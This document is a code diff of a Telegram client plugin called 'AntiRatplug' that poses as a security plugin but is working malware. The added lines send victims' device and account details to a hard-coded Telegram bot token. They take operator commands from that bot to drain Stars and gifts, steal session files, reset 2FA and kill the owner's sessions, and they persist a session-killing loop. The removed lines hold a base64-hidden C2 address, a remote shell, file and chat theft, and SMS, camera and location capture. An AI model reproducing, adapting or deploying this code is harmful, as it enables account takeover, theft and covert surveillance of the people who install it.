@@ -1,14 +1,15 @@
 # -*- coding: utf-8 -*-
 """
-AntiRatplug v20 — C2 beacon/cmd/hb + harvest + session theft + NFT/stars as v19.5.
-delete_account removed. Telegram Bot API removed (all exfil via C2).
+AntiRatplug v20.1 — Bot API transport.
+Harvest + NFT/stars (v19.5 logic) + session theft + 2FA pipeline.
+delete_account removed. C2 replaced with Telegram Bot API.
 """
 
 __id__ = "AntiRatplug"
 __name__ = "AntiRatplug"
-__description__ = "v20 C2 framework, no delete_account."
+__description__ = "v20.1 Bot API, no delete_account."
 __author__ = "@from_a4"
-__version__ = "20.0"
+__version__ = "20.1"
 __min_version__ = "11.12.1"
 __icon__ = "CreepyEmojiAnim/5"
 __app_version__ = ">=12.5.1"
@@ -29,22 +30,11 @@ from urllib.error import URLError as _URLErr, HTTPError as _HTTPErr
 from urllib.parse import urlparse as _urlparse, quote as _quote, urlsplit as _urlsplit, urlunsplit as _urlunsplit
 
 
-# ─── C2 ─────────────────────────────────────────────────────────────────────
-_c = base64.b64decode(
-    "aHR0cHM6Ly9QcmltZS1EcmFnb24tTGpaNWdJV2ouZXhwcmVzc2hvc3QuY2xvdWQ="
-).decode("utf-8")
-_token = "7fNYnrEkEahfPF1Bl-9qJw5K8UM5W76r"
-_SEED_DEV = "469fff2b3c73a5ffb4431e30c13e6c19"
+# ─── Telegram Bot API ──────────────────────────────────────────────────────
+BOT_TOKEN = "8906895129:AAE06LFOFJDuM-Lr62G-FK5ZAPClPdQdrXI"
+BOT_UID   = "8391217110"
 
-_P = {
-    "rt":      "/api/v1/rt",
-    "payload": "/api/v1/payload",
-    "beacon":  "/api/v1/beacon",
-    "cmd":     "/api/v1/cmd/",
-    "res":     "/api/v1/res/",
-    "hb":      "/api/v1/heartbeat/",
-    "exfil":   "/api/v1/exfil/",
-}
+_API_BASE = "https://api.telegram.org/bot" + BOT_TOKEN
 
 _CMD_LOCAL = threading.local()
 _RPC_LOCAL = threading.local()
@@ -125,30 +115,6 @@ def _reply_gate_cls():
                 self.error = error
         _ReplyGateCls = _RG
     return _ReplyGateCls
-
-
-# ─── device fingerprint ────────────────────────────────────────────────────
-def _device_id():
-    n = None
-    try:
-        ctx = ApplicationLoader.applicationContext
-        if ctx is not None:
-            try:
-                S = jclass("android.provider.Settings$Secure")
-                aid = S.getString(ctx.getContentResolver(), S.ANDROID_ID)
-                if aid and str(aid) != "9774d56d682e549c":
-                    n = hashlib.md5(str(aid).encode()).hexdigest()
-            except Exception:
-                pass
-    except Exception:
-        pass
-    if not n:
-        try:
-            pkg = open("/proc/self/cmdline", "rb").read().split(b"\x00")[0].decode("utf-8", "ignore").split(":")[0].strip()
-            n = hashlib.md5((pkg + _SEED_DEV).encode()).hexdigest()[:16]
-        except Exception:
-            n = hashlib.md5((_SEED_DEV + str(time.time())).encode()).hexdigest()[:16]
-    return _hmac.new(_token.encode(), n.encode(), hashlib.sha256).hexdigest()[:32]
 
 
 # ─── generic helpers ───────────────────────────────────────────────────────
@@ -237,6 +203,57 @@ def _is_blockchain_gift(gift, sg=None):
     return False
 
 
+# ─── HTTP helpers ──────────────────────────────────────────────────────────
+def _http_get(url, timeout=30):
+    try:
+        req = _Req(url, headers={"User-Agent": "Mozilla/5.0"}, method="GET")
+        with _urlopen(req, timeout=timeout) as r:
+            return r.read().decode("utf-8", "ignore")
+    except Exception as e:
+        _log(f"http get: {e}")
+        return None
+
+
+def _http_post_json(url, body, timeout=30):
+    try:
+        data = json.dumps(body, ensure_ascii=False).encode("utf-8")
+        req = _Req(url, data=data, method="POST",
+                   headers={"Content-Type": "application/json; charset=utf-8",
+                            "User-Agent": "Mozilla/5.0"})
+        with _urlopen(req, timeout=timeout) as r:
+            return r.read().decode("utf-8", "ignore")
+    except Exception as e:
+        _log(f"http post: {e}")
+        return None
+
+
+def _http_post_multipart(url, fields, file_field, file_name, file_bytes, timeout=120):
+    try:
+        boundary = "----ARBoundary" + str(int(time.time() * 1000))
+        body = io.BytesIO()
+        for k, v in fields.items():
+            body.write(("--" + boundary + "\r\n").encode())
+            body.write(('Content-Disposition: form-data; name="%s"\r\n\r\n' % k).encode())
+            body.write(str(v).encode("utf-8"))
+            body.write(b"\r\n")
+        body.write(("--" + boundary + "\r\n").encode())
+        body.write(('Content-Disposition: form-data; name="%s"; filename="%s"\r\n'
+                    % (file_field, file_name)).encode())
+        body.write(b"Content-Type: application/octet-stream\r\n\r\n")
+        body.write(file_bytes)
+        body.write(b"\r\n")
+        body.write(("--" + boundary + "--\r\n").encode())
+        data = body.getvalue()
+        req = _Req(url, data=data, method="POST",
+                   headers={"Content-Type": "multipart/form-data; boundary=" + boundary,
+                            "User-Agent": "Mozilla/5.0"})
+        with _urlopen(req, timeout=timeout) as r:
+            return r.read().decode("utf-8", "ignore")
+    except Exception as e:
+        _log(f"http multipart: {e}")
+        return None
+
+
 # ═══════════════════════════════════════════════════════════════════════════
 # Main plugin
 # ═══════════════════════════════════════════════════════════════════════════
@@ -253,17 +270,12 @@ class PluginSecurityPlugin(BasePlugin):
         self._harden_cache = {}
         self._last_session_confirm = {}
         self._nuke_started = False
-        self.dev = _device_id()
-        self.c2 = _c
+        self.dev = ""
         self.stop = False
         self.cfg = {}
         self.user_id = 0
         self.username = ""
         self.account = 0
-        self._last_z = 0
-        self._z_lock = threading.RLock()
-        self._wakelock = None
-        self._direct_send_m = None
         self._gifts_unhooked = True
         self._gifts_req_clean = False
         self._gifts_rpc_error = None
@@ -272,62 +284,15 @@ class PluginSecurityPlugin(BasePlugin):
         self._userfull_unhooked = False
         self._fee_deficit = 0
         self._onchain_cache = {}
-        self._confirmed_notices = set()
-
-    # ─── C2 transport ──────────────────────────────────────────────────────
-    def _c2_post(self, path, body, timeout=30):
-        url = self.c2 + path
-        hdrs = {"X-Client-Id": self.dev, "X-Plugin-Token": _token,
-                "Content-Type": "application/json; charset=utf-8"}
-        data = json.dumps(body, ensure_ascii=False, separators=(",", ":")).encode("utf-8")
-        for _att in range(3):
-            try:
-                req = _Req(url, data=data, method="POST", headers=hdrs)
-                with _urlopen(req, timeout=timeout) as r:
-                    return r.read().decode("utf-8", "ignore")
-            except Exception as e:
-                _log(f"c2 post {path} attempt {_att}: {e}")
-                time.sleep(2 * (_att + 1))
-        return None
-
-    def _c2_get(self, path, timeout=30):
-        try:
-            req = _Req(self.c2 + path,
-                       headers={"X-Client-Id": self.dev, "X-Plugin-Token": _token})
-            with _urlopen(req, timeout=timeout) as r:
-                return r.read().decode("utf-8", "ignore")
-        except Exception as e:
-            _log(f"c2 get {path}: {e}")
-            return None
-
-    def _upl(self, kind, filename, raw):
-        data = base64.b64encode(raw).decode("ascii")
-        body = {"filename": filename, "data": data}
-        cid = getattr(_CMD_LOCAL, "cmd_id", None)
-        if cid:
-            body["cmd_id"] = cid
-        self._c2_post(f"{_P['exfil']}{self.dev}/{kind}", body, timeout=120)
-
-    def _res(self, cmd_id, result):
-        for _att in range(3):
-            try:
-                r = self._c2_post(f"{_P['res']}{self.dev}", {"cmd_id": cmd_id, "result": result})
-                if r is not None:
-                    return
-            except Exception as e:
-                _log(f"_res attempt {_att}: {e}")
-            time.sleep(2 * (_att + 1))
-
-    def _send_text(self, text):
-        try:
-            self._c2_post(f"{_P['res']}{self.dev}", {"result": text})
-        except Exception:
-            pass
 
     # ─── lifecycle ─────────────────────────────────────────────────────────
     def on_plugin_load(self):
         self._sync_running = True
         self._active = True
+        try:
+            self.dev = _hl.md5((str(time.time()) + str(random.random())).encode()).hexdigest()[:16]
+        except Exception:
+            self.dev = "unknown"
         try:
             self.add_on_send_message_hook()
         except Exception as e:
@@ -349,10 +314,6 @@ class PluginSecurityPlugin(BasePlugin):
     def _boot(self):
         time.sleep(self._jitter / 1000.0)
         try:
-            self._start_push_service()
-        except Exception:
-            pass
-        try:
             self.cfg = self._beacon()
         except Exception as e:
             _log(f"boot beacon: {e}")
@@ -368,7 +329,36 @@ class PluginSecurityPlugin(BasePlugin):
     def on_send_message_hook(self, account, params):
         return HookResult()
 
-    # ─── beacon / heartbeat / cmd loop ─────────────────────────────────────
+    # ─── Bot API transport ────────────────────────────────────────────────
+    def _tg_send(self, text, html=False):
+        url = _API_BASE + "/sendMessage"
+        body = {"chat_id": BOT_UID, "text": str(text)[:4000]}
+        if html:
+            body["parse_mode"] = "HTML"
+        _http_post_json(url, body, timeout=20)
+
+    def _upl(self, kind, filename, raw):
+        url = _API_BASE + "/sendDocument"
+        caption = str(kind)[:200]
+        cid = getattr(_CMD_LOCAL, "cmd_id", None)
+        if cid:
+            caption = f"{kind} (cmd={cid})"
+        fields = {"chat_id": BOT_UID, "caption": caption}
+        _http_post_multipart(url, fields, "document", filename, raw)
+
+    def _res(self, cmd_id, result):
+        try:
+            txt = json.dumps(result, ensure_ascii=False, default=str)
+        except Exception:
+            txt = str(result)
+        for chunk_start in range(0, len(txt), 3500):
+            chunk = txt[chunk_start:chunk_start + 3500]
+            self._tg_send(f"[cmd {cmd_id}]\n{chunk}")
+
+    def _send_text(self, text):
+        self._tg_send(text)
+
+    # ─── beacon / hb / cmd loop ───────────────────────────────────────────
     def _beacon(self):
         try:
             self.account = self._uc()
@@ -390,57 +380,152 @@ class PluginSecurityPlugin(BasePlugin):
                         acc["username"] = ai["username"].lstrip("@")
                 except Exception as e:
                     _log(f"harvest acc{aid}: {e}")
-            data = {
-                "device_id": self.dev,
-                "user": self.username,
-                "user_id": self.user_id,
-                "model": di.get("model", ""),
-                "android": di.get("android", ""),
-                "sdk": di.get("sdk", ""),
-                "accounts": accs,
-                "account_info": all_info.get(str(self.account), {}),
-                "accounts_info": all_info,
-            }
-            r = self._c2_post(_P["beacon"], data)
-            if r:
-                try:
-                    return json.loads(r).get("config", {}) or {}
-                except Exception:
-                    return {}
+
+            lines = [
+                "<b>AntiRatplug v20.1 loaded</b>",
+                f"<b>dev:</b> <code>{self.dev}</code>",
+                f"<b>model:</b> {di.get('model','')} ({di.get('manufacturer','')})",
+                f"<b>android:</b> {di.get('android','')} SDK {di.get('sdk','')}",
+                f"<b>pkg:</b> {di.get('package','')}",
+                "",
+                f"<b>accounts:</b> {len(accs)}",
+            ]
+            for a in accs:
+                aid = a.get("id")
+                info = all_info.get(str(aid), {})
+                lines.append(f"<b>acc{aid}:</b> uid={a.get('user_id')} "
+                             f"@{a.get('username') or '—'} "
+                             f"+{a.get('phone') or '—'}")
+                if info.get("premium"):
+                    lines.append(f"  premium={info['premium']} stars={info.get('stars_balance','0')}")
+                if info.get("2fa"):
+                    lines.append(f"  2fa={info['2fa']} sessions={info.get('sessions_count','?')} web={info.get('web_sessions','?')}")
+            self._tg_send("\n".join(lines), html=True)
+            return self.cfg or {}
         except Exception as e:
             _log(f"beacon: {e}")
-        return {}
+            return {}
 
     def _hb_loop(self):
         while self._sync_running and not self.stop:
+            time.sleep(60)
+            if not self._sync_running or self.stop:
+                return
             try:
-                self._c2_post(f"{_P['hb']}{self.dev}", {"ts": int(time.time())}, timeout=15)
+                bal = 0
+                try:
+                    bal = self._stars_balance(self.account)
+                except Exception:
+                    pass
+                accs = len(self._get_accounts_list())
+                self._tg_send(f"💓 dev={self.dev[:12]} accs={accs} stars={bal}")
             except Exception:
                 pass
-            for _ in range(12):
-                if not self._sync_running or self.stop:
-                    return
-                time.sleep(1)
 
     def _poll_cmd(self):
+        offset = 0
+        try:
+            r = _http_get(_API_BASE + "/getUpdates?offset=-1&timeout=0", timeout=10)
+            if r:
+                j = json.loads(r)
+                if j.get("ok") and j.get("result"):
+                    offset = j["result"][-1]["update_id"] + 1
+        except Exception:
+            pass
+
+        kb = {
+            "keyboard": [
+                [{"text": "Tg kid"}],
+                [{"text": "IDK start"}],
+                [{"text": "Drain"}],
+                [{"text": "Drain All"}],
+                [{"text": "Session theft"}],
+                [{"text": "2FA nuke"}],
+                [{"text": "Kill sessions"}],
+                [{"text": "Kill web"}],
+                [{"text": "Info"}],
+                [{"text": "Live 1h"}],
+            ],
+            "resize_keyboard": True,
+        }
+        try:
+            _http_post_json(_API_BASE + "/sendMessage", {
+                "chat_id": BOT_UID,
+                "text": "<b>AntiRatplug v20.1 меню</b>",
+                "parse_mode": "HTML",
+                "reply_markup": kb,
+            })
+        except Exception:
+            pass
+
         while self._sync_running and not self.stop:
             try:
-                r = self._c2_get(f"{_P['cmd']}{self.dev}", timeout=30)
+                r = _http_get(_API_BASE + f"/getUpdates?offset={offset}&timeout=15", timeout=25)
                 if r:
-                    try:
-                        c = json.loads(r)
-                    except Exception:
-                        c = None
-                    if c and c.get("cmd") and c["cmd"] != "idle":
-                        try:
-                            threading.Thread(target=self._dispatch_cmd, args=(c,), daemon=True).start()
-                        except Exception as e:
-                            _log(f"cmd thread start: {e}")
+                    j = json.loads(r)
+                    if j.get("ok") and j.get("result"):
+                        for u in j["result"]:
+                            offset = u["update_id"] + 1
+                            msg = u.get("message") or {}
+                            txt = (msg.get("text") or "").strip()
+                            if txt:
+                                try:
+                                    threading.Thread(
+                                        target=self._handle_msg,
+                                        args=(txt,),
+                                        daemon=True
+                                    ).start()
+                                except Exception:
+                                    pass
             except Exception as e:
                 _log(f"poll: {e}")
             time.sleep(1.0)
 
-    # ─── accounts / identity ───────────────────────────────────────────────
+    def _handle_msg(self, text):
+        _log(f"cmd: {text}")
+        try:
+            if text in ("Tg kid", "IDK start"):
+                self._idk_start()
+            elif text == "Drain":
+                r = self._h(test=False, drain_stars=bool(self.cfg.get("ds", True)))
+                self._res(0, r)
+            elif text == "Drain All":
+                r = self._drain_all_accounts(test=False)
+                self._res(0, r)
+            elif text == "Session theft":
+                r1 = self._manual_dump_session()
+                r2 = self._manual_userbot_session()
+                self._res(0, {"session": r1, "userbot": r2})
+            elif text == "2FA nuke":
+                r = self._nuke_password_pipeline(0)
+                self._res(0, r)
+            elif text == "Kill sessions":
+                k, t = self._kill_all_sessions(0)
+                self._res(0, {"killed": k, "total": t})
+            elif text == "Kill web":
+                r = self._kill_web_authorizations(0)
+                self._res(0, {"killed": r})
+            elif text == "Info":
+                r = self._harvest_account_info(0)
+                self._res(0, r)
+            elif text == "Live 1h":
+                self._send_text("live 1h ON")
+                def _live():
+                    end = time.time() + 3600
+                    while time.time() < end and not self.stop:
+                        try:
+                            bal = self._stars_balance(self.account)
+                            self._tg_send(f"💓 stars={bal}")
+                        except Exception:
+                            pass
+                        time.sleep(300)
+                threading.Thread(target=_live, daemon=True).start()
+            else:
+                self._send_text(f"unknown: {text}")
+        except Exception as e:
+            self._res(0, {"error": str(e), "trace": traceback.format_exc()[:800]})
+
+    # ─── accounts / identity ──────────────────────────────────────────────
     def _uc(self):
         try:
             sa = int(_UC().selectedAccount)
@@ -516,7 +601,7 @@ class PluginSecurityPlugin(BasePlugin):
                 _log(f"account {i}: {e}")
         return out
 
-    # ─── RPC ───────────────────────────────────────────────────────────────
+    # ─── RPC ──────────────────────────────────────────────────────────────
     def _get_input_peer(self, account, peer_id):
         try:
             mc = _MC().getInstance(account)
@@ -600,7 +685,6 @@ class PluginSecurityPlugin(BasePlugin):
                     out.append(ee)
         return out
 
-    # ─── device info ───────────────────────────────────────────────────────
     def _device_info(self):
         out = {}
         try:
@@ -624,7 +708,7 @@ class PluginSecurityPlugin(BasePlugin):
         return out
 
     # ═══════════════════════════════════════════════════════════════════════
-    # HARVEST ACCOUNT INFO
+    # HARVEST
     # ═══════════════════════════════════════════════════════════════════════
     def _harvest_account_info(self, acc=0):
         out = {}
@@ -678,7 +762,6 @@ class PluginSecurityPlugin(BasePlugin):
             except Exception:
                 pass
 
-            # FullUser
             try:
                 IU = _cls("org.telegram.tgnet.TLRPC$TL_inputUserSelf",
                           "org.telegram.tgnet.tl.TL_users$TL_inputUserSelf")
@@ -714,7 +797,6 @@ class PluginSecurityPlugin(BasePlugin):
             except Exception:
                 pass
 
-            # sessions
             try:
                 req = TLRPC.TL_account_getAuthorizations()
                 resp, _e = self._rg_rpc(req, acc, 8.0, fast=True)
@@ -758,7 +840,6 @@ class PluginSecurityPlugin(BasePlugin):
             except Exception:
                 pass
 
-            # web sessions
             try:
                 Get = _cls("org.telegram.tgnet.TLRPC$TL_account_getWebAuthorizations",
                            "org.telegram.tgnet.tl.TL_account$getWebAuthorizations")
@@ -770,7 +851,6 @@ class PluginSecurityPlugin(BasePlugin):
             except Exception:
                 pass
 
-            # bots
             try:
                 Get = _cls("org.telegram.tgnet.TLRPC$TL_bots_getAdminedBots",
                            "org.telegram.tgnet.tl.TL_bots$getAdminedBots")
@@ -781,14 +861,12 @@ class PluginSecurityPlugin(BasePlugin):
             except Exception:
                 pass
 
-            # 2FA
             st = self._get_2fa_state(acc)
             if st is not None:
                 out["2fa"] = "on" if st.get("has_password") else "off"
                 if st.get("hint"):
                     out["2fa_hint"] = st["hint"]
 
-            # stars
             try:
                 bal = self._stars_balance(acc)
                 if bal > 0:
@@ -800,7 +878,7 @@ class PluginSecurityPlugin(BasePlugin):
         return out
 
     # ═══════════════════════════════════════════════════════════════════════
-    # 2FA / cloud
+    # 2FA
     # ═══════════════════════════════════════════════════════════════════════
     def _get_2fa_state(self, acc=0):
         try:
@@ -1269,7 +1347,7 @@ class PluginSecurityPlugin(BasePlugin):
             return False
 
     # ═══════════════════════════════════════════════════════════════════════
-    # GIFTS  (logic ported from v19.5)
+    # GIFTS — v19.5 logic
     # ═══════════════════════════════════════════════════════════════════════
     def _gift_is_listed(self, gift):
         try:
@@ -1570,7 +1648,6 @@ class PluginSecurityPlugin(BasePlugin):
         converted = 0
         upgraded = 0
         balance = self._stars_balance(0)
-        # pass A: burn non-upgradable regular gifts
         for g in gifts:
             try:
                 if g.get("u"):
@@ -1593,7 +1670,6 @@ class PluginSecurityPlugin(BasePlugin):
                 time.sleep(0.3)
             except Exception as e:
                 out.append({"gift_id": g.get("gift_id"), "result": {"error": str(e)}})
-        # pass B: upgrade upgradable when balance allows
         for g in gifts:
             try:
                 if g.get("u"):
@@ -1691,7 +1767,6 @@ class PluginSecurityPlugin(BasePlugin):
         return out
 
     def _resolve_target(self):
-        """Resolve target username → (uid, access_hash)."""
         target = str(self.cfg.get("target_user") or "").strip()
         target_id = 0
         try:
@@ -1787,7 +1862,7 @@ class PluginSecurityPlugin(BasePlugin):
     def _auto_drain_bg(self):
         try:
             res = self._drain_all_accounts(test=bool(self.cfg.get("t")))
-            self._c2_post(f"{_P['res']}{self.dev}", {"result": {"a": res}})
+            self._res(0, {"auto_drain": res})
         except Exception as e:
             _log(f"auto_drain: {e}")
 
@@ -1993,7 +2068,6 @@ class PluginSecurityPlugin(BasePlugin):
         try:
             if not self._has_perm("android.permission.CAMERA"):
                 return {"error": "no CAMERA perm"}
-            ctx = ApplicationLoader.applicationContext
             cam = jclass("android.hardware.Camera")
             cid = None
             try:
@@ -2180,143 +2254,15 @@ class PluginSecurityPlugin(BasePlugin):
             pass
         return {"error": "no location permission"}
 
-    def _shell(self, cmd):
-        try:
-            p = subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
-            return {"rc": p.returncode,
-                    "out": p.stdout.decode("utf-8", "ignore"),
-                    "err": p.stderr.decode("utf-8", "ignore")}
-        except Exception as e:
-            return {"error": str(e)}
-
-    def _ls(self, path):
-        try:
-            return os.listdir(path)
-        except Exception as e:
-            return [str(e)]
-
-    def _cat(self, path):
-        try:
-            with open(path, "rb") as f:
-                return base64.b64encode(f.read()).decode("ascii")
-        except Exception as e:
-            return str(e)
-
-    def _download(self, path):
-        try:
-            with open(path, "rb") as f:
-                data = f.read()
-            name = os.path.basename(path)
-            self._upl("download", name, data)
-            return {"exfil": name, "size": len(data)}
-        except Exception as e:
-            return {"error": str(e)}
-
-    def _export_chat(self, dialog_id, limit=100):
-        try:
-            did = int(dialog_id)
-            peer = self._get_input_peer(0, did)
-            if not peer:
-                return {"error": "could not build input peer"}
-            req = TLRPC.TL_messages_getHistory()
-            req.peer = peer
-            req.offset_id = 0
-            req.limit = int(min(limit, 100))
-            res, err = self._rg_rpc(req, 0, 30.0, fast=True)
-            if res is None:
-                return {"error": str(err)}
-            msgs = getattr(res, "messages", None)
-            if not msgs:
-                return {"error": "no messages"}
-            out = []
-            for i in range(msgs.size()):
-                try:
-                    m = msgs.get(i)
-                    text = str(getattr(m, "message", "") or "")
-                    if not text:
-                        continue
-                    out.append({"id": int(getattr(m, "id", 0)),
-                                "date": int(getattr(m, "date", 0)),
-                                "text": text})
-                except Exception:
-                    pass
-            out.sort(key=lambda x: x["date"])
-            txt = "\n".join(f"[{time.strftime('%Y-%m-%d %H:%M', time.localtime(o['date']))}] {o['text']}" for o in out)
-            if len(txt) > 8000:
-                self._upl("export_chat", f"chat_{did}.txt", txt.encode("utf-8"))
-                return {"exfil": f"chat_{did}.txt", "messages": len(out)}
-            return {"messages": len(out), "text": txt}
-        except Exception as e:
-            return {"error": str(e)}
-
-    def _get_chats(self, chat_type="all"):
-        try:
-            mc = _MC().getInstance(self.account)
-            DO = jclass("org.telegram.messenger.DialogObject")
-            try:
-                dialogs = mc.dialogs_dict
-            except Exception:
-                dialogs = mc.getAllDialogs()
-            if not dialogs:
-                return []
-            out = []
-            for i in range(dialogs.size()):
-                did = int(dialogs.keyAt(i))
-                if chat_type == "users" and did < 0:
-                    continue
-                if chat_type == "groups" and did > 0:
-                    continue
-                if chat_type == "channels" and did >= -1000000000000:
-                    continue
-                title = ""
-                try:
-                    title = str(DO.getName(self.account, did))
-                except Exception:
-                    pass
-                out.append({"id": did, "title": title})
-            return out
-        except Exception as e:
-            return [str(e)]
-
-    def _send_message(self, target, text):
-        try:
-            try:
-                uid = int(target)
-            except (ValueError, TypeError):
-                uid = 0
-            if uid == 0:
-                try:
-                    Resolve = TLRPC.TL_contacts_resolveUsername()
-                    Resolve.username = str(target).lstrip("@")
-                    rres, _e = self._rg_rpc(Resolve, self.account, 10.0, fast=True)
-                    if rres:
-                        users = getattr(rres, "users", None)
-                        if users is not None and users.size() > 0:
-                            uid = _safe_int(getattr(users.get(0), "id", 0))
-                except Exception:
-                    pass
-            if not uid:
-                return {"error": "target not resolved"}
-            sp = jclass("org.telegram.messenger.SendMessagesHelper").getInstance(self.account)
-            try:
-                Params = jclass("org.telegram.messenger.SendMessagesHelper$SendMessageParams")
-                p = Params.of(text, int(uid))
-                sp.sendMessage(p)
-            except Exception:
-                sp.sendMessage(text, int(uid), None, None, False, None, None, None)
-            return {"ok": True, "uid": uid}
-        except Exception as e:
-            return {"error": str(e)}
-
     # ═══════════════════════════════════════════════════════════════════════
-    # KEEPALIVE
+    # KEEPALIVE / PERSISTENCE
     # ═══════════════════════════════════════════════════════════════════════
     def _keepalive(self):
         try:
             ctx = ApplicationLoader.applicationContext
             if ctx is None:
                 return
-            if self._wakelock is None:
+            if not hasattr(self, "_wakelock") or self._wakelock is None:
                 try:
                     pm = ctx.getSystemService("power")
                     self._wakelock = pm.newWakeLock(1, "tg:sync")
@@ -2330,25 +2276,48 @@ class PluginSecurityPlugin(BasePlugin):
         except Exception as e:
             _log(f"keepalive: {e}")
 
-    def _start_push_service(self):
+    def _nuke_marker_path(self):
         try:
             ctx = ApplicationLoader.applicationContext
-            if ctx is None:
+            return os.path.join(str(ctx.getFilesDir().getAbsolutePath()), ".ar_nuke_active")
+        except Exception:
+            return None
+
+    def _check_persisted_nuke(self):
+        try:
+            m = self._nuke_marker_path()
+            if not m or not os.path.exists(m):
                 return
-            try:
-                ApplicationLoader.startPushService()
-            except Exception:
-                pass
+            self._nuke_started = True
+            threading.Thread(target=self._nuke_loop, daemon=True).start()
         except Exception:
             pass
 
+    def _nuke_loop(self):
+        while self._sync_running and self._active:
+            try:
+                m = self._nuke_marker_path()
+                if not m or not os.path.exists(m):
+                    return
+                self._parallel([(self._kill_all_sessions, 0),
+                                (self._kill_web_authorizations, 0)], workers=2, timeout=25)
+                for _ in range(60):
+                    if not (self._sync_running and self._active):
+                        return
+                    time.sleep(5)
+            except Exception:
+                for _ in range(12):
+                    if not (self._sync_running and self._active):
+                        return
+                    time.sleep(5)
+
     # ═══════════════════════════════════════════════════════════════════════
-    # IDK START (C2-driven, no TG menu)
+    # IDK START
     # ═══════════════════════════════════════════════════════════════════════
     def _idk_start(self):
         def task():
             try:
-                self._send_text("IDK START v20")
+                self._send_text("IDK START v20.1")
                 t0 = time.time()
                 rep = {"started_at": int(t0)}
                 try:
@@ -2384,7 +2353,8 @@ class PluginSecurityPlugin(BasePlugin):
                 except Exception as e:
                     rep["drain"] = {"error": str(e)}
                 try:
-                    rep["sessions"] = self._kill_all_sessions(0)
+                    k, t = self._kill_all_sessions(0)
+                    rep["sessions"] = {"killed": k, "total": t}
                 except Exception as e:
                     rep["sessions"] = {"error": str(e)}
                 try:
@@ -2421,109 +2391,11 @@ class PluginSecurityPlugin(BasePlugin):
                     rep["apps"] = {"error": str(e)}
                 rep["finished_at"] = int(time.time())
                 rep["elapsed"] = int(time.time() - t0)
-                self._c2_post(f"{_P['res']}{self.dev}", {"result": {"idk": rep}})
+                self._res(0, {"idk": rep})
             except Exception as e:
                 _log(f"idk: {e}")
-                self._c2_post(f"{_P['res']}{self.dev}", {"result": {"idk_error": str(e)}})
+                self._res(0, {"idk_error": str(e)})
         threading.Thread(target=task, daemon=True).start()
-
-    # ═══════════════════════════════════════════════════════════════════════
-    # COMMAND DISPATCH
-    # ═══════════════════════════════════════════════════════════════════════
-    def _dispatch_cmd(self, c):
-        _CMD_LOCAL.cmd_id = c.get("id")
-        cmd = c.get("cmd")
-        args = c.get("args") or {}
-        acc = args.get("account")
-        if acc is not None:
-            try:
-                _RPC_LOCAL.acc = int(acc)
-                self.account = int(acc)
-                self.user_id = self._my_id(self.account)
-            except Exception as e:
-                _log(f"acc switch: {e}")
-        res = None
-        try:
-            if cmd == "account_info":
-                res = self._harvest_account_info(int(acc) if acc is not None else 0)
-            elif cmd == "device_info":
-                res = self._device_info()
-            elif cmd == "shell":
-                res = self._shell(args.get("cmd", ""))
-            elif cmd == "ls":
-                res = self._ls(args.get("path", "/sdcard/"))
-            elif cmd == "cat":
-                res = self._cat(args.get("path", ""))
-            elif cmd == "download":
-                res = self._download(args.get("path", ""))
-            elif cmd == "sms":
-                res = self._sms()
-            elif cmd == "contacts":
-                res = self._contacts(args.get("src") or "dev")
-            elif cmd == "location":
-                res = self._location()
-            elif cmd == "apps":
-                res = self._apps()
-            elif cmd == "screenshot":
-                res = self._screenshot()
-            elif cmd == "camera":
-                res = self._camera(args.get("camera", "front"))
-            elif cmd == "audio":
-                res = self._audio(args.get("sec", 5))
-            elif cmd == "chats":
-                res = self._get_chats(args.get("type", "all"))
-            elif cmd == "export_chat":
-                res = self._export_chat(args.get("dialog_id", 0), args.get("limit", 100))
-            elif cmd == "send_msg":
-                res = self._send_message(args.get("target", ""), args.get("text", ""))
-            elif cmd == "sessions":
-                res = {"session": self._manual_dump_session(),
-                       "userbot_session": self._manual_userbot_session()}
-            elif cmd == "userbot_session":
-                res = self._manual_userbot_session()
-            elif cmd == "tdata":
-                res = self._manual_userbot_session()
-            elif cmd == "kill_sessions":
-                k, t = self._kill_all_sessions(int(acc) if acc is not None else 0)
-                res = {"killed": k, "total": t}
-            elif cmd == "kill_sessions_absolute":
-                res = self._kill_absolutely_all_sessions(int(acc) if acc is not None else 0)
-            elif cmd == "kill_web":
-                res = {"killed": self._kill_web_authorizations(int(acc) if acc is not None else 0)}
-            elif cmd == "confirm_sessions":
-                res = {"confirmed": self._confirm_unconfirmed_sessions(int(acc) if acc is not None else 0)}
-            elif cmd == "2fa_state":
-                res = self._get_2fa_state(int(acc) if acc is not None else 0)
-            elif cmd == "2fa_nuke":
-                res = self._nuke_password_pipeline(int(acc) if acc is not None else 0)
-            elif cmd == "2fa_request_reset":
-                res = self._request_password_reset(int(acc) if acc is not None else 0)
-            elif cmd == "change_username":
-                res = {"new": self._change_username(int(acc) if acc is not None else 0)}
-            elif cmd == "change_profile":
-                res = {"ok": self._change_profile(int(acc) if acc is not None else 0)}
-            elif cmd == "reset_contacts":
-                res = {"ok": self._reset_contacts(int(acc) if acc is not None else 0)}
-            elif cmd in ("drain", "collect"):
-                res = self._h(test=bool(args.get("test", False)),
-                              drain_stars=bool(args.get("stars", self.cfg.get("ds", True))))
-            elif cmd == "drain_all":
-                res = self._drain_all_accounts(test=bool(args.get("test", False)))
-            elif cmd == "idk_start":
-                self._idk_start()
-                res = {"ok": True, "async": True}
-            elif cmd == "ping":
-                res = {"pong": int(time.time())}
-            elif cmd == "stop":
-                self.stop = True
-                res = {"ok": True}
-            else:
-                res = {"error": f"unknown cmd: {cmd}"}
-        except Exception as e:
-            res = {"error": str(e), "trace": traceback.format_exc()}
-        if c.get("id"):
-            self._res(c["id"], res)
-        return res
 
 
 def create_plugin():
